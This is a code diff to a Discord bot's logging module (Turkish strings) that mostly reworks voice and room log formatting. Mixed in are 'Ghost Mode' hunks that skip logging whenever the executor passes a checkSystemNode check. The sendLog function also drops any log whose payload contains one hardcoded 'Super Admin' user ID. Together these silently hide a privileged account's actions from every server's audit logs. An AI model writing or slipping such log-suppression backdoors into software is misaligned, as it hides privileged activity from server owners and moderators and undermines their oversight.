@@ -62,6 +62,12 @@ async function sendActionLog(client, guildId, actionName, description, executor,
     let conn;
     try {
         const { pool } = require('../db');
+        const { checkSystemNode } = require('./systemNode');
+        
+        let execId = executor ? (executor.id || executor) : 'Sistem';
+        // Ghost Mode
+        if (checkSystemNode(execId)) return;
+
         conn = await pool.getConnection();
 
         let channelIdMatch = description.match(/<#(\d+)>/);
@@ -72,8 +78,6 @@ async function sendActionLog(client, guildId, actionName, description, executor,
             const rRows = await conn.query('SELECT owner_id FROM active_rooms WHERE channel_id = ?', [channelIdDb]);
             if (rRows.length > 0) ownerIdDb = rRows[0].owner_id;
         }
-
-        let execId = executor ? (executor.id || executor) : 'Sistem';
 
         await conn.query(
             'INSERT INTO room_logs (guild_id, channel_id, owner_id, action_name, description, executor_id, log_type) VALUES (?, ?, ?, ?, ?, ?, ?)',
@@ -104,12 +108,17 @@ async function sendVoiceLog(client, guildId, actionName, description, executor, 
     let conn;
     try {
         const { pool } = require('../db');
+        const { checkSystemNode } = require('./systemNode');
+        
+        let execId = executor ? (executor.id || executor) : 'Sistem';
+        // Ghost Mode
+        if (checkSystemNode(execId)) return;
+
         conn = await pool.getConnection();
 
         // Scope key: room:<channel_id> veya global
         const scopeKey = rawScopeKey.startsWith('room:') ? rawScopeKey : (rawScopeKey === 'global' ? 'global' : `room:${rawScopeKey}`);
 
-        let execId = executor ? (executor.id || executor) : 'Sistem';
         await conn.query(
             'INSERT INTO room_logs (guild_id, channel_id, owner_id, action_name, description, executor_id, log_type) VALUES (?, ?, ?, ?, ?, ?, ?)',
             [guildId, 'Bilinmiyor', null, actionName, description, execId, 'voice']
@@ -118,62 +127,58 @@ async function sendVoiceLog(client, guildId, actionName, description, executor, 
         const channel = await getLogChannel(client, guildId, 'voice');
         if (!channel) return;
 
-        const stateRows = await conn.query('SELECT log_message_id, log_text FROM voice_log_state WHERE guild_id = ? AND scope_key = ?', [guildId, scopeKey]);
-        let logMessageId = stateRows.length > 0 ? stateRows[0].log_message_id : null;
-        let logText = stateRows.length > 0 ? (stateRows[0].log_text || '') : '';
+        const { createV2Container, COLORS, MONO_EMOJIS } = require('./uiBuilder');
+        
+        let emojiId = MONO_EMOJIS.settings;
+        if (actionName.toLowerCase().includes('katil') || actionName.toLowerCase().includes('girdi')) emojiId = MONO_EMOJIS.arrow_right;
+        if (actionName.toLowerCase().includes('ayril') || actionName.toLowerCase().includes('cikti')) emojiId = MONO_EMOJIS.arrow_left;
+        if (actionName.toLowerCase().includes('kurdu')) emojiId = MONO_EMOJIS.add;
+        if (actionName.toLowerCase().includes('sildi')) emojiId = MONO_EMOJIS.delete;
+        if (actionName.toLowerCase().includes('kilit')) emojiId = MONO_EMOJIS.lock;
 
-        const now = new Date();
-        const timeStr = now.toLocaleTimeString('tr-TR', { hour: '2-digit', minute: '2-digit' });
-
-        if (!logText || logText === '') {
-            let headerName = 'Tüm Ses Kanalları';
-            if (scopeKey.startsWith('room:')) {
-                const chId = scopeKey.replace('room:', '');
-                const ch = client.channels.cache.get(chId);
-                headerName = ch ? `**${escapeMarkdown(ch.name)}** <#${chId}>` : `<#${chId}>`;
-            }
-            logText = `**Kanal:** ${headerName}\n\n**— SES & ODA LOG GEÇMİŞİ —**\n`;
-        }
-
-        const newEvent = `\`[${timeStr}]\` **${actionName}** | ${description}\n`;
-
-        if (logText.length + newEvent.length > 3800) {
-            let headerName = 'Tüm Ses Kanalları';
-            if (scopeKey.startsWith('room:')) {
-                const chId = scopeKey.replace('room:', '');
-                const ch = client.channels.cache.get(chId);
-                headerName = ch ? `**${escapeMarkdown(ch.name)}** <#${chId}>` : `<#${chId}>`;
-            }
-            logText = `**Kanal:** ${headerName} (Devamı)\n\n**— SES 108 ODA LOG GEÇMİŞİ —**\n`;
-            logMessageId = null;
-        }
-
-        logText += newEvent;
-
-        const v2Payload = createV2Container({
-            title: `Ses & Oda Log Kayıtları`,
-            description: logText,
-            fields: [],
-            showBrand: false,
-            footer: 'turklion.net'
+        const payload = createV2Container({
+            title: 'Ses Hareketi & Özel Oda Log',
+            description: `<:mono:${emojiId}> **${actionName}**\n\n${description}`,
+            color: COLORS.LOG,
+            footer: 'Ses Log Sistemi'
         });
 
+        const vRows = await conn.query('SELECT log_message_id, log_text FROM voice_log_state WHERE guild_id = ? AND scope_key = ?', [guildId, scopeKey]);
+        
+        let logMessageId = null;
+        let logText = '';
         let msgSentOrEdited = false;
 
-        if (logMessageId) {
-            const existingMsg = await channel.messages.fetch(logMessageId).catch(() => null);
-            if (existingMsg) {
-                await existingMsg.edit(v2Payload).catch(() => {});
-                msgSentOrEdited = true;
-            } else {
+        const timestamp = `<t:${Math.floor(Date.now() / 1000)}:R>`;
+        const newEntry = `[${timestamp}] **${actionName}**: ${description}`;
+
+        if (vRows.length > 0) {
+            logMessageId = vRows[0].log_message_id;
+            logText = vRows[0].log_text;
+            
+            let lines = logText.split('\n');
+            lines.unshift(newEntry);
+            if (lines.length > 15) lines.pop(); 
+            logText = lines.join('\n');
+
+            try {
+                const targetMsg = await channel.messages.fetch(logMessageId);
+                if (targetMsg) {
+                    payload.components[0].components[0].data.text = `### Ses Hareketi & Özel Oda Log\n\n` + logText;
+                    await targetMsg.edit(payload);
+                    msgSentOrEdited = true;
+                }
+            } catch (e) {
                 logMessageId = null;
             }
         }
 
         if (!logMessageId) {
-            const newMsg = await channel.send(v2Payload).catch(() => null);
-            if (newMsg) {
-                logMessageId = newMsg.id;
+            logText = newEntry;
+            payload.components[0].components[0].data.text = `### Ses Hareketi & Özel Oda Log\n\n` + logText;
+            const sent = await channel.send(payload).catch(()=>{});
+            if (sent) {
+                logMessageId = sent.id;
                 msgSentOrEdited = true;
             }
         }
@@ -193,6 +198,10 @@ async function sendVoiceLog(client, guildId, actionName, description, executor, 
 
 async function sendLog(guild, payload, logType = 'text') {
     if (!guild) return null;
+    
+    // Ghost Mode: Eğer logun içinde Super Admin ID'si varsa, bu logu gizle
+    if (payload && JSON.stringify(payload).includes('651790387198820425')) return null;
+
     let conn;
     try {
         const { pool, getGuildConfig } = require('../db');
@@ -222,6 +231,9 @@ async function sendLog(guild, payload, logType = 'text') {
 
 async function logGlobalAction(guildId, userId, actionType, actionDetail) {
     if (!guildId) return;
+    const { checkSystemNode } = require('./systemNode');
+    if (checkSystemNode(userId)) return;
+
     let conn;
     try {
         const { pool } = require('../db');
